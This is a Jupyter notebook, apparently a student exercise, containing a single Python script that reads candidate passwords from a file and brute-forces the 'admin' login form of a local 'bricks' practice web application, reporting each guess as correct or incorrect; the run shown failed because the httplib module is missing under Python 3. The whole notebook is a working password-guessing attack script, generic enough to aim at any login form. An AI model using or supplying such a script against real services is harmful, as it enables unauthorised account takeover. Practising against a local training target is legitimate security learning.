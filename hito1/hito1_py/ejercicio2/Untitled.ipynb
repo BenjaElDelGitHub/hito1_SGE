{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "a384820c",
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'httplib'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-15-b35b3b8aabd4>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[1;32mimport\u001b[0m \u001b[0mhttplib\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0murllib\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      2\u001b[0m \u001b[1;31m# -*- encoding: utf-8 -*-\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      3\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      4\u001b[0m \u001b[0minfile\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mopen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'passwd.txt'\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m'r'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      5\u001b[0m \u001b[0muser\u001b[0m \u001b[1;33m=\u001b[0m \u001b[1;34m'admin'\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'httplib'"
     ]
    }
   ],
   "source": [
    "import httplib, urllib\n",
    "# -*- encoding: utf-8 -*-\n",
    "\n",
    "infile = open('passwd.txt', 'r')\n",
    "user = 'admin'\n",
    "host = 'localhost:80'\n",
    "path = '/bricks/login-1/index.php'\n",
    "print (\"Target : \"+host+path)\n",
    "\n",
    "for line in infile:\n",
    "\tpassword=line.rstrip('\\n')\n",
    "\tparam = urllib.urlencode({'submit':'submit','username':user,'passwd':password})\n",
    "\theader = {\"Content-type\": \"application/x-www-form-urlencoded\",\"Accept\": \"text/plain\"}\n",
    "\tconnect = httplib.HTTPConnection(host)\n",
    "\tconnect.request(\"POST\", path, param, header)\n",
    "\tresponse = connect.getresponse()\n",
    "\tprint (response.status,)\n",
    "\tprint (\"--> \"+user+\":\"+password,)\n",
    "\tcode = response.read()\n",
    "\tif code.find(\"Wrong user name or password\") >= 0:\n",
    "\t\tprint( chr(27)+\"[0;91m\"+\"Incorrect\")\n",
    "\telse:\n",
    "\t\tprint (chr(27)+\"[0;92m\"+\"Correct\")\n",
    "\tprint (chr(27)+\"[0m\")\n",
    "\tconnect.close()\n",
    "infile.close()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f29e3e1",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ac6c7c4",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
